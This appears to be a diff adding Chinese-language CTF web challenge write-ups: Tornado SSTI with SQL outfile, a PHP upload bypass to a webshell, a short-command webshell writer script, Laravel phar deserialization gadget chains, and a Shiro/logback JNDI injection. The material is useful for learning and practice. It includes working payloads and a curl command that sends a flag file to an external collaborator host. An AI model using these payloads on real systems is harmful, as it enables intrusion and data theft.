+            for i in tornado.web.RequestHandler._template_loaders:
+                tornado.web.RequestHandler._template_loaders[i].reset()
+
+        msg = self.get_argument('congratulations', 'oh! you find it')
+        bans = []
+        for ban in bans:
+            if ban in msg:
+                self.finish('bad hack,go out!')
+                return
+
+        with open('congratulations.html', 'w') as (f):
+            f.write('<html><head><title>congratulations</title></head><body><script type="text/javascript">alert("%s");location.href=\'/admin.php\';</script></body></html>\n' % msg)
+            f.flush()
+        self.render('congratulations.html')
+        if tornado.web.RequestHandler._template_loaders:
+            for i in tornado.web.RequestHandler._template_loaders:
+                tornado.web.RequestHandler._template_loaders[i].reset()
+                
+def make_app():
+    return tornado.web.Application([
+     (
+      '/index.php', MainHandler),
+     (
+      '/login.php', LoginHandler),
+     (
+      '/logout.php', LogoutHandler),
+     (
+      '/register.php', RegisterHandler),
+     (
+      '/admin.php', AdminHandler),
+     (
+      '/qwbimage.php', ImageHandler),
+     (
+      '/good_job_my_ctfer.php', SecretHandler),
+     (
+      '/', MainHandler)], **settings)
+
+
+if __name__ == '__main__':
+    app = make_app()
+    app.listen(8000)
+    tornado.ioloop.IOLoop.current().start()
+    print('start')
+```
+
+可以看到`/good_job_my_ctfer.php`有ssti，但是`{{}}`被过滤，只能用`{%%}`，这里用到的是`{%extends %}`，它可以传递一个文件路径作为参数，将其包含并渲染
+
+所以我们可以先通过sqli的outfile写文件，然后通过ssti包含 来执行读flag的命令
+
+```
+/register.php?username=amiz&password={%set return __import__("os").popen("cat /flag").read()%}
+/register.php?username=amiz' into outfile '/var/lib/mysql-files/amiz&password=amiz
+/good_job_my_ctfer.php?congratulations={%extends /var/lib/mysql-files/amiz%}
+```
+
+先通过注册把payload写到密码部分，然后outfile到mysql的默认导出目录`/var/lib/mysql-files/`，最后包含
+
+flag{79d863ac-1fc6-42f6-951a-d3b6f0468b7f}
+
+{{% /spoiler %}}
+
+{{% spoiler "[PWNHUB 公开赛 2018]傻 fufu 的工作日" %}}
+
+/UploadFile.class.php.bak, /index.php.bak 有备份文件泄露，使用phpjiami进行加密，我们用脚本进行解密
+
+```
+<?php
+if($_FILES) {
+    include 'UploadFile.class.php';
+    $dist = 'upload';
+    $upload = new UploadFile($dist, 'upfile');
+    $data = $upload->upload();
+}
+```
+
+```
+<?php
+
+class UploadFile {
+    public $error = '';
+
+    protected $field;
+    protected $allow_ext;
+    protected $allow_size;
+    protected $dist_path;
+    protected $new_path;
+
+    function __construct($dist_path, $field='upfile', $new_name='random', $allow_ext=['gif', 'jpg', 'jpeg', 'png'], $allow_size=102400)
+    {
+        $this->field = $field;
+        $this->allow_ext = $allow_ext;
+        $this->allow_size = $allow_size;
+        $this->dist_path = realpath($dist_path);
+
+        if ($new_name === 'random') {
+            $this->new_name = uniqid();
+        } elseif (is_string($new_name)) {
+            $this->new_name = $new_name;
+        } else {
+            $this->new_name = null;
+        }
+    }
+
+    protected function codeToMessage($code) 
+    { 
+        switch ($code) {
+            case UPLOAD_ERR_INI_SIZE: 
+                $message = "The uploaded file exceeds the upload_max_filesize directive in php.ini"; 
+                break; 
+            case UPLOAD_ERR_FORM_SIZE: 
+                $message = "The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form";
+                break; 
+            case UPLOAD_ERR_PARTIAL: 
+                $message = "The uploaded file was only partially uploaded"; 
+                break; 
+            case UPLOAD_ERR_NO_FILE: 
+                $message = "No file was uploaded"; 
+                break; 
+            case UPLOAD_ERR_NO_TMP_DIR: 
+                $message = "Missing a temporary folder"; 
+                break; 
+            case UPLOAD_ERR_CANT_WRITE: 
+                $message = "Failed to write file to disk"; 
+                break; 
+            case UPLOAD_ERR_EXTENSION: 
+                $message = "File upload stopped by extension"; 
+                break; 
+            default: 
+                $message = "Unknown upload error"; 
+                break; 
+        } 
+        return $message; 
+    } 
+
+    protected function error($info)
+    {
+        $this->error = $info;
+        return false;
+    }
+
+    public function upload()
+    {
+        if(empty($_FILES[$this->field])) {
+            return $this->error('上传文件为空');
+        }
+        if(is_array($_FILES[$this->field]['error'])) {
+            return $this->error('一次只能上传一个文件');
+        }
+        if($_FILES[$this->field]['error'] != UPLOAD_ERR_OK) {
+            return $this->error($this->codeToMessage($_FILES[$this->field]['error']));
+        }
+        $filename = !empty($_POST[$this->field]) ? $_POST[$this->field] : $_FILES[$this->field]['name'];
+        if(!is_array($filename)) {
+            $filename = explode('.', $filename);
+        }
+        foreach ($filename as $name) {
+            if(preg_match('#[<>:"/\\|?*.]#is', $name)) {
+                return $this->error('文件名中包含非法字符');
+            }
+        }
+
+        if($_FILES[$this->field]['size'] > $this->allow_size) {
+            return $this->error('你上传的文件太大');
+        }
+        if(!in_array($filename[count($filename)-1], $this->allow_ext)) {
+            return $this->error('只允许上传图片文件');
+        }
+
+        // 用.分割文件名，只保留首尾两个字符串，防御Apache解析漏洞
+        $origin_name = current($filename);
+        $ext = end($filename);
+        $new_name = ($this->new_name ? $this->new_name : $origin_name) . '.' . $ext;
+        $target_fullpath = $this->dist_path . DIRECTORY_SEPARATOR . $new_name;
+
+        // 创建目录
+        if(!is_dir($this->dist_path)) {
+            mkdir($this->dist_path);
+        }
+
+        if(is_uploaded_file($_FILES[$this->field]['tmp_name']) && move_uploaded_file($_FILES[$this->field]['tmp_name'], $target_fullpath)) {
+            // Success upload
+        } elseif (rename($_FILES[$this->field]['tmp_name'], $target_fullpath)) {
+            // Success upload
+        } else {
+            return $this->error('写入文件失败，可能是目标目录不可写');
+        }
+
+        return [
+            'name' => $origin_name,
+            'filename' => $new_name,
+            'type' => $ext
+        ];
+    }
+}
+ 
+```
+
+注意到这个后缀
+
+```
+$filename = !empty($_POST[$this->field]) ? $_POST[$this->field] : $_FILES[$this->field]['name'];
+if(!in_array($filename[count($filename)-1], $this->allow_ext)) {
+    return $this->error('只允许上传图片文件');
+}
+$ext = end($filename);
+$target_fullpath = $this->dist_path . DIRECTORY_SEPARATOR . $new_name;
+```
+
+在判断的时候用的是`count($filename)-1`，变相提示我们可以有很多的`name`，配合数组进行绕过
+
+![image-20220122191921885](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220122191921885.png)
+
+```
+/upload/61ebe7df95da2.php?amiz=system('cat /flag_9bc85242c9f1a7663e6806778e8a8558');
+```
+
+flag_9bc85242c9f1a7663e6806778e8a8558
+
+{{% /spoiler %}}
+
+{{% spoiler "*ctf473831530_2018_web_virink_web" %}}
+
+```
+<?php
+    $sandbox = '/www/sandbox/' . md5('orange' . $_SERVER['REMOTE_ADDR']);
+    mkdir($sandbox);
+    chdir($sandbox);
+    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 20) {
+        exec($_GET['cmd']);
+    } else if (isset($_GET['reset'])) {
+        exec('/bin/rm -rf ' . $sandbox);
+    }
+    echo "<br /> IP : {\$_SERVER['REMOTE_ADDR']}";
+?>
+```
+
+跟orange佬的[[HitconCTF 2017]babyfirst-revenge](https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge)一样，对cmd字符数更宽松了，这里采用师傅的脚本
+
+```python
+import requests
+
+base_url = 'http://a40430ad-39b5-4020-a550-14afee81e640.node1.buuoj.cn'
+
+
+def exec_cmd2(c):
+    # exec cmd
+    my_params = {
+        'cmd': c
+    }
+    r = requests.get(base_url, params=my_params)
+    print('exec cmd2', c, r)
+
+
+def write_webshell():
+    filename = [r'>echo\ \\', r">\'\<\?php \\", r'>eval\(', r'>\$_GET\[c\]\)', r">\;\'\>2.php"]
+    for i in filename:
+        my_params = {
+            'cmd': i
+        }
+        r = requests.get(base_url, params=my_params)
+        print(i, r.status_code)
+
+    cmd_list = ['ls -tr>1.sh', 'sh 1.sh']
+    for i in cmd_list:
+        exec_cmd2(i)
+
+if __name__ == '__main__':
+    write_webshell()
+    print('ok')
+
+```
+
+之后用/sandbox/xxxx/2.php?c=eval($_POST['cmd']);连接蚁剑，不过由于环境问题，后面内网的部分做不了了，寄
+
+参考：[wp](https://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/)
+
+{{% /spoiler %}}
+
+## page 08
+
+{{% spoiler "[HFCTF 2021 Final]tinypng" %}}
+
+是laravel框架，给了很详细的源码，但是主要的也就是这些
+
+![image-20210802232459194](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210802232459194.png)
+
+![image-20210802233146758](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210802233146758.png)
+
+给出的laravel框架的源码，版本是8.53.0，首先从/routes/web.php入手看一下路由
+
+![image-20210804005426972](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804005426972.png)
+
+一共两个路由，`/`即`/index`，实现的是文件上传的一些处理 比如后缀的过滤和文件名的设置之类的，`/image`则是特殊的，跟过去看ImageController类
+
+![image-20210804005822800](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804005822800.png)
+
+亮点在第25行，新建了一个imgcompress实例并执行compressImg()，跟过去看
+
+![image-20210804010352158](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804010352158.png)
+
+![image-20210804010520380](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804010520380.png)
+
+首先调用的`_openImage()`里第44行的`getimagesize()`结合phar会触发反序列化，此处的参数$this->src来自于`$source`，也就是`$request -> input('image');`，也就是我们传入的image参数，可控
+
+反序列化的入口找到了，接下来就是找一找调用链，这里就直接放出来（我太菜了 寄
+
+可用链子1
+
+```php
+<?php
+namespace Symfony\Component\Routing\Loader\Configurator{
+    class ImportConfigurator{
+        private $parent;
+        private $route;
+        public function __construct($class){
+            $this->parent=$class;
+            $this->route='test';
+        }
+    }
+}
+ 
+namespace Mockery{
+    class HigherOrderMessage{
+        private $mock;
+        private $method;
+        public function __construct($class){
+            $this->mock=$class;
+            $this->method='generate';
+        }
+    }
+}
+ 
+namespace PHPUnit\Framework\MockObject{
+    final class MockTrait{
+        private $mockName;
+        private $classCode;
+        public function __construct(){
+            $this->mockName='123';
+            $this->classCode='phpinfo();';
+        }
+    }
+}
+ 
+namespace{
+    use \Symfony\Component\Routing\Loader\Configurator\ImportConfigurator;
+    use \Mockery\HigherOrderMessage;
+    use \PHPUnit\Framework\MockObject\MockTrait;
+    $c=new MockTrait();
+    $b=new HigherOrderMessage($c);
+    $a=new ImportConfigurator($b);
+    @unlink("phar.phar");
+    $phar=new Phar("phar.phar");
+    $phar->startBuffering(); 
+    $phar->setStub('GIF89a'."__HALT_COMPILER();"); 
+    $phar->setMetadata($a); 
+    $phar->addFromString("test.txt", "test");
+    $phar->stopBuffering();
+}
+ 
+?>
+```
+
+可用链子2
+
+```php
+<?php
+namespace Illuminate\Broadcasting {
+    class PendingBroadcast {
+        protected $events;
+        protected $event;
+        public function __construct($events, $event) {
+            $this->events = $events;
+            $this->event = $event;
+        }
+    }
+
+    class BroadcastEvent {
+        public $connection;
+        public function __construct($connection) {
+            $this->connection = $connection;
+        }
+    }
+}
+
+namespace Illuminate\Bus {
+    class Dispatcher {
+        protected $queueResolver;
+        public function __construct($queueResolver){
+            $this->queueResolver = $queueResolver;
+        }
+    }
+}
+
+
+namespace {
+    $c = new Illuminate\Broadcasting\BroadcastEvent('ls');
+    $b = new Illuminate\Bus\Dispatcher('system');
+    $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);
+    #print(urlencode(serialize($a)));
+    @unlink("phar.phar");
+    $phar=new Phar("phar.phar");
+    $phar->startBuffering();
+    $phar->setStub('GIF89a'."__HALT_COMPILER();");
+    $phar->setMetadata($a);
+    $phar->addFromString("test.txt", "test");
+    $phar->stopBuffering();
+}
+```
+
+将生成的phar文件用gzip压缩后上传（记得要改一下content-type），在image处访问`/image?image=phar://../storage/app/uploads/xxxxxxxxxx.png`即可看到隐藏在500报错下面的phpinfo
+
+![image-20210803004021941](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803004021941.png)
+
+光看到phpinfo不是目标，还需要继续执行命令，这里用的是第二个链子 相当于执行以下的命令
+
+```
+system("cd ../../../;ls");
+system("cd ../../../;cat flag");
+```
+
+![image-20210803122653978](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803122653978.png)
+
+![image-20210803122933503](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803122933503.png)
+
+参考：[wp1](https://guokeya.github.io/post/z5gHcmbVj/)  [wp2](https://vuln.top/2021/05/08/16204457586099/)
+
+————哄堂大孝了家人们 我是憨批 这个get传image的地方我一直在用post传 我还在纳闷为啥一直会报405的错😅😅😅
+
+{{% /spoiler %}}
+
+{{% spoiler "[NPUCTF2020]EzShiro" %}}
+
+和 [红明谷CTF 2021]JavaWeb 是完全一样的payload
+
+首先是一个/;/json绕过鉴权，之后是jndi注入，用那个jar一把梭
+
+```json
+["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"rmi://101.35.114.107:1099/qhx0ip"}]
+```
+
+```bash
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "curl http://mg6uynla2pxa8ilgp4cprm0suj09oy.burpcollaborator.net/ -F file=@/flag" -A "101.35.114.107"
+```
+
+{{% /spoiler %}}
+
+
+
+
+
+
+
+
 
 
 
